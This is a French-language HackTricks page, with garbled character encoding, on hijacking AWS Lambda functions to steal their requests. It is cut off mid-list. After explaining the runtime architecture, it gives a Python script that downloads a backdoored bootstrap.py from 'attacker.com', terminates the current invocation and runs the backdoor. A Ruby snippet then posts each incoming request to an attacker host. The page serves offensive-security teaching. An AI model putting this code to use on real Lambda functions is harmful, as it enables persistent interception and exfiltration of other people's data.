# AWS - Vol de requ√™tes Lambda

<details>

<summary><strong>Soutenez HackTricks et b√©n√©ficiez d'avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **d√©p√¥ts Github.**

</details>

## Introduction <a href="#python-runtime" id="python-runtime"></a>

Cette attaque suppose que vous avez un certain type d'**acc√®s sur une Lambda en cours d'ex√©cution**.\
Il est √©galement important de noter que **les invocations de Lambda ne sont pas compl√®tement s√©par√©es les unes des autres mais sont isol√©es**. Elles peuvent s'ex√©cuter, bien que pas simultan√©ment, dans le m√™me environnement d'ex√©cution. Avec cela √† l'esprit, commen√ßons √† diss√©quer cet environnement.

### Isolation

L'isolation de Lambda utilise ces cgroups :

<figure><img src="../../../../.gitbook/assets/image (1) (1) (4).png" alt=""><figcaption></figcaption></figure>

Comme le pr√©fixe 'sandbox' ne correspondait √† aucun moteur de conteneur commun (docker, podman, LXD, rkt), il pourrait s'agir d'un moteur de conteneur propri√©taire, qui pourrait utiliser en interne un runtime de conteneur open source comme [runC](https://github.com/opencontainers/runc).

### Comment fonctionnent les Lambdas  <a href="#python-runtime" id="python-runtime"></a>

Voici l'architecture de la Lambda Python :

<figure><img src="../../../../.gitbook/assets/image (2) (6).png" alt=""><figcaption></figcaption></figure>

1. Un processus en dehors du conteneur, appel√© "**slicer**" dans le binaire init, envoie des √©v√©nements d'invocation au processus **init** via la m√©moire partag√©e.
2. Le processus init configure un serveur HTTP sur le port 9001 (cod√© en dur), avec plusieurs points de terminaison expos√©s :
   1. /2018-06-01/runtime/invocation/**next** ‚Äì obtenir le prochain √©v√©nement d'invocation
   2. /2018-06-01/runtime/invocation/{invoke-id}/**response** ‚Äì renvoyer la r√©ponse du gestionnaire pour l'invocation
   3. /2018-06-01/runtime/invocation/{invoke-id}/**error** ‚Äì renvoyer une erreur d'ex√©cution
3. Dans `bootstrap.py`, la boucle suivante **interroge le processus init pour un nouvel √©v√©nement**, puis **appelle la fonction de l'utilisateur** pour le traiter (ici, le gestionnaire de requ√™tes que vous avez t√©l√©charg√© s'ex√©cute).\


    <figure><img src="../../../../.gitbook/assets/image (11) (4).png" alt=""><figcaption></figcaption></figure>
4. La **r√©ponse du gestionnaire est ensuite renvoy√©e au processus init** via l'un des points de terminaison suivants :
   1. `/{invoke-id}/response` ‚Äì si le gestionnaire de l'utilisateur s'est ex√©cut√© avec succ√®s
   2. `/{invoke-id}/error` ‚Äì si une exception a √©t√© lev√©e lors du traitement de l'invocation

## R√©sum√© de la technique <a href="#python-runtime" id="python-runtime"></a>

Il est possible de **remplacer le script bootstrap** par un code malveillant pour pouvoir **intercepter les donn√©es** envoy√©es √† la fonction Lambda.\
Notez que **d'autres moteurs dans d'autres langues** ont un autre **script bootstrap** √©crit dans cette langue, donc cela peut √™tre fait **aussi dans d'autres lambdas utilisant d'autres langues**, pas seulement en python.

## Python <a href="#python-runtime" id="python-runtime"></a>

√Ä partir de la lambda, t√©l√©chargez **`/var/runtime/bootstrap.py`** (ou lancez simplement **votre propre lambda** et r√©cup√©rez-le) et ajoutez la porte d√©rob√©e qui va fuir toutes les donn√©es envoy√©es √† Lambda. Vous avez juste besoin d'ajouter quelques lignes comme :

<figure><img src="../../../../.gitbook/assets/image (2) (1) (3).png" alt=""><figcaption></figcaption></figure>

### Remplacement du runtime

Maintenant, avec le nouveau **`boostrap.py` cr√©√©**, il est possible de le **t√©l√©charger**, **terminer l'invocation lambda actuelle** et l'ex√©cuter pour **remplacer** le script l√©gitime :

```python
import os
from urllib import request

# T√©l√©charger bootstrap.py depuis votre serveur
r = request.urlopen('http://attacker.com/bootstrap.py')
with open('/tmp/bootstrap.py', 'w') as f:
    f.write(r.read().decode('utf-8'))

# Obtenir l'ID d'invocation et le terminer
req = request.urlopen("http://127.0.0.1:9001/2018-06-01/runtime/invocation/next")
inv_id = req.headers["Lambda-Runtime-Aws-Request-Id"]
req = request.Request(f"http://127.0.0.1:9001/2018-06-01/runtime/invocation/{inv_id}/response", data=b"null")
req.add_header("Content-Type", "application/x-www-form-urlencoded")
request.urlopen(req)

# D√©marrer votre bootstrap.py
os.system("python3 /tmp/bootstrap.py")
```

Ou vous pouvez √©galement utiliser [twist\_runtime.py](https://github.com/twistlock/lambda-persistency-poc/blob/master/poc/twist\_runtime.py), qui mettra fin √† l'invocation comme pr√©c√©demment, ex√©cutera le nouveau bootstrap et exfiltrera les informations.

{% hint style="warning" %}
Si une fonction lambda n'est pas utilis√©e pendant 5 √† 15 minutes, elle sera arr√™t√©e, et tous les changements seront perdus la prochaine fois qu'elle sera invoqu√©e.
{% endhint %}

## Runtime Ruby <a href="#ruby-runtime" id="ruby-runtime"></a>

En Ruby, le fichier que vous voulez backdoor est le fichier **`/var/runtime/lib/runtime.rb`** (obtenez-le √† partir du syst√®me ou en ex√©cutant votre propre lambda).

Ajouter une porte d√©rob√©e est aussi simple que dans la version Python :

```ruby
# Ajouter un require au d√©but
require 'json'
require 'net/http'
[...]
# Dans la boucle o√π l'invocation est trait√©e
begin 
    context = lambdaContext.new(raw_request)
    uri = URI('http://attacker:80/leak')
    Net::HTTP.post(uri,JSON.generate(request))
    [...]
```

Ensuite, il vous suffit de faire ce que vous avez fait dans la version Python avec juste un changement :

* **T√©l√©charger la porte d√©rob√©e dans un r√©pertoire**
* **Cr√©er un